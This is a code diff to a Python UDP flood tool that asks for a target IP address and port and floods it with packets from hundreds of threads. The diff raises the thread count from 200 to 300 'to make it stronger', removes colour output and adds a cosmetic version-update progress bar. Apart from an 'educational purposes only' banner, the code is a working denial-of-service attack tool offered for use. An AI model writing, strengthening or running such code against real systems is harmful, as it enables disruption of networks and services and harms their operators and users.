@@ -7,7 +7,7 @@ import os
 
 # Change terminal title to 'ricebitev.2'
 def change_terminal_title():
-    os.system("title ricebitev.2")  # Works on Windows, for Linux/Mac, use `os.system('echo -n -e "\033]0;ricebitev.2\007"')`
+    os.system("title ricebitev.3")  # Works on Windows, for Linux/Mac, use `os.system('echo -n -e "\033]0;ricebitev.2\007"')`
 
 # ASCII Art Header
 def print_header():
@@ -19,9 +19,9 @@ def print_header():
     | |__| |  __/ | | | ||  __/ |  | |_) |  __/ |   
     |_____/ \___|_| |_|\__\___|_|  |____/ \___|_|   
     """)
-    print("\033[1;31;47mWARNING: This tool is for educational purposes only!\033[0m")
-    print("\n\033[1;32;47mTargeted Denial of Service (DoS) Attack Initiated...\033[0m")
-    print("\n\033[1;34;47mPress Ctrl+C to stop the attack at any time.\033[0m")
+    print("WARNING: This tool is for educational purposes only!\n")
+    print("Targeted Denial of Service (DoS) Attack Initiated...\n")
+    print("Press Ctrl+C to stop the attack at any time.\n")
     time.sleep(2)
 
 # Send UDP packets to the target IP
@@ -33,11 +33,19 @@ def send_packet(ip, port):
     while True:
         try:
             client.sendto(bytes_to_send, (ip, port))
-            sys.stdout.write(f"\033[1;33;47mPacket sent to {ip}:{port}\033[0m\n")
-            sys.stdout.flush()
         except Exception as e:
-            sys.stderr.write(f"\033[1;31;47mError: {e}\033[0m\n")
+            sys.stderr.write(f"Error: {e}\n")
             break
+
+# Display the "Updating Version 3" message with a progress bar
+def show_version_update():
+    print("\nUpdating Version 3...\n")
+    for i in range(101):
+        sys.stdout.write("\r[{}{}] {}%".format(
+            '#' * (i // 2), ' ' * (50 - (i // 2)), i))
+        sys.stdout.flush()
+        time.sleep(0.04)  # 4 seconds in total
+    sys.stdout.write("\n")
 
 # Main function to handle user input and attack
 def main():
@@ -45,39 +53,34 @@ def main():
     change_terminal_title()
 
     print_header()
+    show_version_update()
 
     # Ask for the target IP and port
-    ip = input("\033[1;36;47mEnter the IP address to attack: \033[0m")
+    ip = input("Enter the IP address to attack: ")
     
     try:
-        port = int(input("\033[1;36;47mEnter the port to attack (default 80): \033[0m") or 80)
+        port = int(input("Enter the port to attack (default 80): ") or 80)
     except ValueError:
-        print("\033[1;31;47mInvalid port number. Using default port 80.\033[0m")
+        print("Invalid port number. Using default port 80.")
         port = 80
 
-    print(f"\n\033[1;33;47mTargeting IP: {ip}, Port: {port}...\033[0m")
+    print(f"\nTargeting IP: {ip}, Port: {port}...\n")
 
     # Create and start threads for concurrent packet sending
     threads = []
-    for i in range(200):  # Adjust the number of threads based on the required intensity
+    for i in range(300):  # Increase number of threads to make it stronger
         thread = threading.Thread(target=send_packet, args=(ip, port))
         thread.daemon = True
         threads.append(thread)
         thread.start()
     
-    # Give the illusion of a progress bar
+    # Give the illusion of a progress bar for the attack
     try:
-        print("\033[1;32;47mStarting attack...\033[0m")
-        for i in range(101):
-            sys.stdout.write("\r\033[1;35;47mAttack Progress: [{}{}] {}%".format(
-                '#' * (i // 2), ' ' * (50 - (i // 2)), i))
-            sys.stdout.flush()
-            time.sleep(0.1)
-        sys.stdout.write("\n")
+        print("Starting attack...\n")
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\n\n\033[1;31;47mAttack stopped by user.\033[0m")
+        print("\n\nAttack stopped by user.")
 
 if __name__ == "__main__":
     main()
